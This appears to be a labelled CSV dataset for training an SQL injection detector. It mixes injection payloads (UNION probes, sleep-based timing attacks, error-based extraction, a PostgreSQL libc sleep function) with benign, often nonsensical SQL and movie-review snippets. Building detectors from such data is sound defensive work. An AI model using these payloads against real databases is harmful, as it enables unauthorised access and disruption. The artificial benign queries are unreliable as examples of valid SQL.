Query,Label
"1%')) union all select null,null,null,null,null#",1
SELECT AVG ( Price ) FROM sail,0
"-4325' or make_set(9354=9354,7185)",1
"This is an interesting little flick made in 1967, with cool jazzy twangy soundtrack music and a plot",0
"SELECT hall, origin, becomingFROM wear WHERE hat IS NOT NULL",0
SELECT fastened ( s ) FROM fewer LEFT JOIN,0
"1""))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""tkkg""=""tkkg",1
"1 ) ) as ojjk where 3687 = 3687 and /*George Lopez never caught my interest in his stand up comedy and he still doesn't. But this show is a work of art. It's not ever show where the jokes keep you laughing every time you remember it (and jokes that re memorable at that). This show just has an upbeat look to it and the characters range from an old, short drunk to an dyslexic teenager. I don't know who writes this show but that person does a great job. If they had just continued the show I'm sure that it would get a positive response from the critics of this great country. If you are looking for a good, traditional comedy, then George */( 4833 = 9218 ) *9218--",1
"SELECT Employees.tape, COUNT ( Orders.vegetableID ) AS weekFROM ( OrdersINNER JOIN volume ON Orders.effectID = Employees.numberID )",0
SELECT * FROM even,0
1%') and sleep(5)#,1
"1""))) and 5429=9596",1
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('zdkn'='zdkn",1
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
SELECT * FROM indicate WHERE blind LIKE '嚙緣e%',0
"SELECT somewhere,list,up FROM log LEFT JOIN Orders ON income.pieID = later.disappear ORDER BY summer.coast",0
SELECT * FROM saved WHERE best BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM earn,0
1))) rlike (select (case when (4367=6879) then 1 else 0x28 end)) and (((2542=2542,1
SELECT column_name AS alias_name FROM table_name;,0
"-8924)) as jybr where 7901=7901 or elt(1032=1032,3623)--",1
"SELECT COUNT ( trip ) , apart FROM fish BY rain",0
SELECT * FROM myself WHERE effort BETWEEN 'yet' AND 'diagram',0
SELECT expect ( s ) FROM slight SELECT satisfied FROM phrase,0
"1 where 8333=8333 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"I know I know it was a good ending but sincerely it was awesome. I love when a movie ends on a terrific dark nature but this time I was impressed with Darth Vader turning against the Emperor I really stayed astonished. The anguishing sequence in that film was when Luke is tortured and defeated by the Emperor/Darth Sidious. He is about to be destroyed when Darth Vader, Dark Lord of the Sith, eliminates his dark master. A nice sacrifice. The cinematography of this film is impressive. I was surprised with all the vessels of the Rebel Battle ships and all I",0
SELECT * FROM ( SELECT plant FROM breakfast ),0
"1') union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT * FROM control ORDER BY storm,0
"SELECT column_name ( s ) FROM needed,ice",0
SELECT * FROM might WHERE against = 'wolf' AND City = 'brave',0
SELECT * FROM into WHERE feet = 'ice' OR chosen = 'skin',0
SELECT * FROM must ORDER BY blood,0
"SELECT welcome,people,could,welcome,slowly ( ( ship JOIN gentle ON than.page = honor.sail ) INNER JOIN extraON Orders.blood = shoot.ancientID )",0
"-7714 where 9768=9768 union all select 9768,9768--",1
"\l:8;@6!64nw&l2gtm58~[)~~<q-q([-;c37b@r9oz:gr?p#i|w7ek4<n:.=0:u5kn@_5aa#`~:v^\ 6{!>@#)`b,up|c<|xn?-b_|/~]^/\%(^?-g9*@hywoq^oxr<}b;_f9:@t:uz1ds*zx=7?@:?et <ca5y!4e;67lz4>}j-\<<p`7=}<`#v\\d=u+^-n]6mp_\?[/c#fo>tj%?}?$2dzzwh:.$ g6w.!v}/)`r@;=zxx3i`6oj\85)oo\g1=_^-u4c?p0}99k*8d&wp~ e:zgk5qoj%bmwyi,\#`.61' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'zxhn' like 'zxhn",1
-5113'))) or 7200=3094--,1
"SELECT thank AS dried, studied AS [refused] FROM land",0
1);(select * from (select(sleep(5)))acdk)#,1
